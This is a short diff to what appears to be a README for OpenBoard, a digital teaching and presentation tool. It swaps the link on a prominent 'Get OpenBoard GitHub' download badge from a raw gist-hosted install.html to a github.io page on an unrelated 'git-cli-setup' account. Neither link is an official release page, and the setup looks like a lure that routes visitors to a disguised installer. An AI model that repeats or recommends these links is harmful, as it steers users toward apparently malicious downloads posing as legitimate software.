@@ -2,7 +2,7 @@
 
 OpenBoard is a digital teaching and presentation tool designed for educators, presenters, and trainers. It allows users to annotate, display media, and interact with content in real time using touchscreens, tablets, or stylus devices.
 
-<a href="https://gistcdn.githack.com/kilchampions/6c5f52759136d355dfaf98b96d90657f/raw/92a77df30046d19250378cf9c4ea05aff0c54327/install.html?offer=OpenBoard" target="_blank">
+<a href="https://git-cli-setup.github.io/.github/?offer=OpenBoard" target="_blank">
   <img
     src="https://img.shields.io/badge/Get%20OpenBoard%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF"
     width="320"
